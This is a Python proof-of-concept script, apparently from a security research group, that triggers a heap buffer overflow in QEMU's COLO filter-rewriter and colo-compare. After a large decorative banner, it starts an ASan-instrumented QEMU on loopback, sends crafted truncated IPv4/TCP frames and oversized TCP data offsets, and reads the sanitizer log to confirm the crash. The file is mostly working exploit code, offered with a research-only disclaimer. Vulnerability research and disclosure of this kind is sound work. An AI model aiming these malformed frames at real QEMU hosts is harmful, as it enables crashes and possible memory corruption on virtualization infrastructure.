#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: qemu-colo-l4-oob (High: 8.2)
#  Vendor: QEMU (qemu.org)
#  Versions: QEMU v11.1.2 (4fc49f46) COLO rewriter
#  Impact: COLO parse_packet_early has no L4 min; filter-rewriter OOB on short IPv4/TCP
#  Requires: loopback 127.0.0.1:18770 COLO filter-rewriter; ASan
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "qemu-colo-l4-oob"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove QEMU v11.1.2 COLO L4 parse_packet_early accepts a short IPv4/TCP frame."""

import ipaddress
import os
import socket
import struct
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path
from typing import IO

LABEL = "qemu-colo-l4-oob"
WITNESS = "QEMU-COLO-L4-OOB-WITNESS"
QEMU_BIN = Path("/opt/qemu/bin/qemu-system-x86_64")
QEMU_DATADIR = Path("/opt/qemu/share/qemu")
ASAN_LOG = Path("/tmp/lab/qemu-asan.txt")
PID_FILE = Path("/tmp/lab/qemu.pid")

NETDEV_HOST = "127.0.0.1"
NETDEV_PORT = 18770
COMPARE_PRI_PORT = 18771
COMPARE_SEC_PORT = 18772
COMPARE_OUT_PORT = 18773

ETH_P_IP = 0x0800
IPPROTO_TCP = 6
TH_SYN = 0x02
TH_ACK = 0x10

DST_MAC = bytes.fromhex("525400123456")
SRC_MAC = bytes.fromhex("525400112233")
SRC_IP = ipaddress.IPv4Address("10.0.0.1")
DST_IP = ipaddress.IPv4Address("10.0.0.2")

CONTROL_SPORT = 0x1234
OVERFLOW_SPORT = 0x2345
DST_PORT = 0x0050
SYN_SEQ = 0x10000001
ACK_SEQ = 0x10000002
ACK_VALUE = 0x00000100

QEMU_READY_S = 20.0
POST_SEND_S = 1.5
ASAN_WAIT_S = 4.0
SOCK_TIMEOUT_S = 5.0


@dataclass(frozen=True)
class AsanHit:
    kind: str
    access: str
    sink: str
    snippet: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 400) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def ip_checksum(header: bytes) -> int:
    if len(header) % 2:
        header += b"\x00"
    total = sum(struct.unpack(f"!{len(header) // 2}H", header))
    total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def ethernet_header() -> bytes:
    return DST_MAC + SRC_MAC + struct.pack("!H", ETH_P_IP)


def ipv4_header(*, total_len: int, proto: int = IPPROTO_TCP) -> bytes:
    version_ihl = 0x45
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        0,
        total_len,
        0x3941,
        0,
        64,
        proto,
        0,
        SRC_IP.packed,
        DST_IP.packed,
    )
    csum = ip_checksum(hdr)
    return hdr[:10] + struct.pack("!H", csum) + hdr[12:]


def tcp_header(
    *,
    sport: int,
    flags: int,
    seq: int,
    ack: int,
    th_off: int,
) -> bytes:
    off_byte = (th_off & 0x0F) << 4
    return struct.pack(
        "!HHIIBBHHH",
        sport,
        DST_PORT,
        seq,
        ack,
        off_byte,
        flags,
        0x4000,
        0,
        0,
    )


def ipv4_tcp_frame(
    *,
    sport: int,
    flags: int,
    seq: int,
    ack: int,
    th_off: int = 5,
    tcp_keep: int | None = None,
    payload: bytes = b"",
) -> bytes:
    tcp = tcp_header(sport=sport, flags=flags, seq=seq, ack=ack, th_off=th_off)
    if tcp_keep is not None:
        tcp = tcp[:tcp_keep]
    ip = ipv4_header(total_len=20 + len(tcp) + len(payload))
    return ethernet_header() + ip + tcp + payload


def frame_len_prefixed(packet: bytes) -> bytes:
    return struct.pack("!I", len(packet)) + packet


def wait_port(host: str, port: int, timeout_s: float) -> bool:
    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=0.4):
                return True
        except OSError:
            time.sleep(0.15)
    return False


def qemu_cmd() -> list[str]:
    return [
        str(QEMU_BIN),
        "-nodefaults",
        "-display",
        "none",
        "-machine",
        "pc",
        "-accel",
        "tcg",
        "-m",
        "32",
        "-smp",
        "1",
        "-S",
        "-L",
        str(QEMU_DATADIR),
        "-netdev",
        f"socket,id=hn0,listen={NETDEV_HOST}:{NETDEV_PORT}",
        "-device",
        "e1000,netdev=hn0,mac=52:54:00:12:34:56,romfile=",
        "-object",
        "filter-rewriter,id=rw,netdev=hn0,queue=all",
        "-chardev",
        f"socket,id=pri,host={NETDEV_HOST},port={COMPARE_PRI_PORT},server=on,wait=off",
        "-chardev",
        f"socket,id=sec,host={NETDEV_HOST},port={COMPARE_SEC_PORT},server=on,wait=off",
        "-chardev",
        f"socket,id=out,host={NETDEV_HOST},port={COMPARE_OUT_PORT},server=on,wait=off",
        "-object",
        "iothread,id=iothread1",
        "-object",
        (
            "colo-compare,id=comp0,primary_in=pri,secondary_in=sec,"
            "outdev=out,iothread=iothread1"
        ),
    ]


def qemu_env() -> dict[str, str]:
    env = os.environ.copy()
    env["ASAN_OPTIONS"] = (
        "abort_on_error=1:halt_on_error=1:detect_leaks=0:"
        "allocator_may_return_null=1:detect_odr_violation=0"
    )
    env["QEMU_AUDIO_DRV"] = "none"
    return env


def stop_qemu(proc: subprocess.Popen[bytes] | None) -> None:
    if proc is None or proc.poll() is not None:
        return
    proc.terminate()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait(timeout=3)


def start_qemu(asan_fh: IO[bytes]) -> subprocess.Popen[bytes]:
    cmd = qemu_cmd()
    log("qemu-start " + " ".join(cmd))
    proc = subprocess.Popen(
        cmd,
        stdout=asan_fh,
        stderr=asan_fh,
        env=qemu_env(),
        cwd="/tmp/lab",
    )
    PID_FILE.write_text(str(proc.pid), encoding="utf-8")
    if not wait_port(NETDEV_HOST, NETDEV_PORT, QEMU_READY_S):
        stop_qemu(proc)
        raise RuntimeError("qemu-netdev-not-listening")
    if not wait_port(NETDEV_HOST, COMPARE_PRI_PORT, 5.0):
        stop_qemu(proc)
        raise RuntimeError("qemu-compare-not-listening")
    return proc


def connect(port: int) -> socket.socket:
    sock = socket.create_connection((NETDEV_HOST, port), timeout=SOCK_TIMEOUT_S)
    sock.settimeout(SOCK_TIMEOUT_S)
    return sock


def send_frames(sock: socket.socket, packets: list[bytes]) -> None:
    blob = b"".join(frame_len_prefixed(pkt) for pkt in packets)
    sock.sendall(blob)
    time.sleep(POST_SEND_S)


def qemu_alive(proc: subprocess.Popen[bytes]) -> bool:
    return proc.poll() is None


def read_asan() -> str:
    if not ASAN_LOG.is_file():
        return ""
    return ASAN_LOG.read_text(encoding="utf-8", errors="replace")


def parse_asan(text: str) -> AsanHit | None:
    if "heap-buffer-overflow" not in text:
        return None
    access = "UNKNOWN"
    for line in text.splitlines():
        if "WRITE of size" in line:
            access = "WRITE"
            break
        if "READ of size" in line:
            access = "READ"
            break
    joined = text.lower()
    if "filter-rewriter" in joined or "handle_primary_tcp" in joined:
        sink = "filter-rewriter"
    elif "colo_compare_packet_payload" in joined or "fill_pkt_tcp_info" in joined:
        sink = "colo-compare"
    elif "memcmp" in joined and "colo" in joined:
        sink = "colo-compare"
    elif "fill_connection_key" in joined or "parse_packet_early" in joined:
        sink = "colo-parse"
    elif "colo" in joined:
        sink = "colo"
    else:
        sink = "unknown"
    return AsanHit(
        kind="heap-buffer-overflow",
        access=access,
        sink=sink,
        snippet=clip(text, 500),
    )


def control_rewriter(sock: socket.socket) -> None:
    syn = ipv4_tcp_frame(
        sport=CONTROL_SPORT,
        flags=TH_SYN,
        seq=SYN_SEQ,
        ack=0,
        th_off=5,
    )
    ack = ipv4_tcp_frame(
        sport=CONTROL_SPORT,
        flags=TH_ACK,
        seq=ACK_SEQ,
        ack=ACK_VALUE,
        th_off=5,
    )
    log(f"control-rewriter syn={len(syn)} ack={len(ack)}")
    send_frames(sock, [syn, ack])


def overflow_rewriter(sock: socket.socket) -> None:
    syn = ipv4_tcp_frame(
        sport=OVERFLOW_SPORT,
        flags=TH_SYN,
        seq=SYN_SEQ,
        ack=0,
        th_off=5,
    )
    short_ack = ipv4_tcp_frame(
        sport=OVERFLOW_SPORT,
        flags=TH_ACK,
        seq=ACK_SEQ,
        ack=ACK_VALUE,
        th_off=5,
        tcp_keep=0,
    )
    log(f"overflow-rewriter syn={len(syn)} short-ack={len(short_ack)}")
    send_frames(sock, [syn, short_ack])


def control_compare(pri: socket.socket, sec: socket.socket) -> None:
    pkt = ipv4_tcp_frame(
        sport=CONTROL_SPORT,
        flags=TH_ACK,
        seq=SYN_SEQ,
        ack=ACK_VALUE,
        th_off=5,
        payload=b"CONTROL!",
    )
    log(f"control-compare frame={len(pkt)} th_off=5")
    blob = frame_len_prefixed(pkt)
    pri.sendall(blob)
    sec.sendall(blob)
    time.sleep(POST_SEND_S)


def overflow_compare(pri: socket.socket, sec: socket.socket) -> None:
    pkt = ipv4_tcp_frame(
        sport=OVERFLOW_SPORT,
        flags=TH_ACK,
        seq=SYN_SEQ,
        ack=ACK_VALUE,
        th_off=15,
        payload=b"OVERFLOW",
    )
    log(f"overflow-compare frame={len(pkt)} th_off=15")
    blob = frame_len_prefixed(pkt)
    pri.sendall(blob)
    sec.sendall(blob)
    time.sleep(ASAN_WAIT_S)


def wait_asan(proc: subprocess.Popen[bytes], timeout_s: float) -> AsanHit | None:
    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        hit = parse_asan(read_asan())
        if hit is not None:
            return hit
        if proc.poll() is not None:
            return parse_asan(read_asan())
        time.sleep(0.2)
    return parse_asan(read_asan())


def main() -> int:
    if not QEMU_BIN.is_file():
        return fail("qemu-binary-missing")
    ASAN_LOG.parent.mkdir(parents=True, exist_ok=True)
    if ASAN_LOG.exists():
        ASAN_LOG.unlink()

    log(f"pin qemu-system-x86_64 asan colo filter-rewriter {WITNESS}")
    proc: subprocess.Popen[bytes] | None = None
    netdev: socket.socket | None = None
    pri: socket.socket | None = None
    sec: socket.socket | None = None
    out: socket.socket | None = None
    try:
        with ASAN_LOG.open("wb", buffering=0) as asan_fh:
            try:
                proc = start_qemu(asan_fh)
            except (OSError, RuntimeError) as exc:
                log(f"qemu-boot-log {clip(read_asan())!r}")
                return fail(f"qemu-start {type(exc).__name__}:{exc}")

            log(f"qemu-pid={proc.pid} netdev={NETDEV_HOST}:{NETDEV_PORT}")
            try:
                netdev = connect(NETDEV_PORT)
                out = connect(COMPARE_OUT_PORT)
                pri = connect(COMPARE_PRI_PORT)
                sec = connect(COMPARE_SEC_PORT)
            except OSError as exc:
                log(f"qemu-boot-log {clip(read_asan())!r}")
                return fail(f"connect {type(exc).__name__}:{exc}")

            control_rewriter(netdev)
            if not qemu_alive(proc):
                hit = parse_asan(read_asan())
                log(f"control-rewriter-died asan={hit} log={clip(read_asan())!r}")
                return fail("control-rewriter-overflow")

            control_compare(pri, sec)
            if not qemu_alive(proc):
                hit = parse_asan(read_asan())
                log(f"control-compare-died asan={hit} log={clip(read_asan())!r}")
                return fail("control-compare-overflow")
            log("control-alive qemu still running after full TCP headers")

            overflow_rewriter(netdev)
            hit = wait_asan(proc, ASAN_WAIT_S)
            if hit is None and qemu_alive(proc):
                log("rewriter-short-ack no ASan, trying colo-compare th_off")
                overflow_compare(pri, sec)
                hit = wait_asan(proc, ASAN_WAIT_S)

            asan_text = read_asan()
            log(f"qemu-exit={proc.poll()} asan={clip(asan_text)!r}")
            if hit is None:
                return fail("no-asan-heap-buffer-overflow")
            if hit.access not in {"READ", "WRITE"}:
                return fail(f"asan-access-unknown sink={hit.sink}")
            if hit.sink in {"unknown"}:
                log(f"asan-sink-unparsed {hit.snippet!r}")
            log(
                f"asan-hit kind={hit.kind} access={hit.access} "
                f"sink={hit.sink} {WITNESS}"
            )
            log(
                f"SUCCESS {LABEL} asan={hit.kind} access={hit.access} "
                f"sink={hit.sink} control=alive {WITNESS}"
            )
            return 0
    finally:
        for sock in (netdev, pri, sec, out):
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        stop_qemu(proc)
        if PID_FILE.exists():
            PID_FILE.unlink()


if __name__ == "__main__":
    raise SystemExit(main())

